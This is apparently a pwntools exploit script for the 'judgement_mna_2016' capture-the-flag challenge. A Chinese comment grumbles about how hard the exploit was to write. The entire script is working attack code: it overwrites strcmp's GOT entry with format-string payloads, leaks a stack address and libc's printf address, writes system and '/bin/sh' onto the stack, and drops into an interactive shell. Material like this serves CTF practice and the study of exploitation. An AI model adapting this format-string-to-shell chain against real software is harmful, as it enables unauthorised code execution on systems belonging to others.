from pwn import *

#这个exp写的让我觉得我是个傻逼 懂不懂复杂exp的含金量啊？

#context.log_level = 'debug'

p = process('./judgement_mna_2016')
#p = remote('node4.buuoj.cn', 28751)
elf = ELF('./judgement_mna_2016')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('libc-2.23.buu.so')

main = elf.sym['main']
load_flag = elf.sym['load_flag']
flag = 0x0804A0A0

def adjust(bytes):
    result = [0] * len(bytes)
    for i in range(len(bytes)):
        if bytes[i] == 0x61:
            result[i] = 0
        else:
            result[i] = bytes[i]
    return bytearray(result)

strcmp_got = elf.got['strcmp']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
puts_plt = elf.plt['puts']

payload = fmtstr_payload(44, { strcmp_got : main })
payload = payload[0:0x24] + b'\0' * 0x4 + payload[0x24:0x30]
#payload = b'%8c%52$hhn%35c%53$hhn%1116c%54$hn\0\0\0' + p32(strcmp_got + 3) + p32(strcmp_got) + p32(strcmp_got + 1)
p.sendlineafter(b'flag >> ', payload)
p.sendlineafter(b'flag >> ', b'%13$p')

esp = int(p.recv(10), 16) - 0x2fd + 0x10c - 4
success('esp -> {}'.format(hex(esp)))

payload = b'%45$s\0\0\0' + p32(printf_got)

p.sendlineafter(b'flag >> ', payload)

libc_base = u32(p.recv(4)) - libc.sym['printf']

success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = fmtstr_payload(43, { esp : system }, write_size = 'short')
payload = adjust(payload)

p.sendlineafter(b'flag >> ', payload)

payload = fmtstr_payload(43, { esp + 8 : bin_sh }, write_size = 'short')
payload = adjust(payload)

p.sendlineafter(b'flag >> ', payload)

#gdb.attach(p, 'b *0x80487f2')

p.sendlineafter(b'flag >> ', b'\x01')

p.interactive()